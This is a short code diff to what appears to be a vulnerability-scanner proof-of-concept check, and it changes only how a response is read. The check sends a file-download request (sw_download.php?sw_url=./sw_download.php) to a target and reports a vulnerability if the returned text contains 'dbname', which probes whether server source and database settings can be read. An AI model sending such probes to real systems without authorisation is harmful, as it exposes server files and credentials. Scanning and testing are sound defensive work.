@@ -48,7 +48,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             vul_url = arg + '/software_download/sw_download.php?sw_url=./sw_download.php'
             response = requests.get(vul_url)
-            if response.status_code == 200 and 'dbname' in response.content:
+            if response.status_code == 200 and 'dbname' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
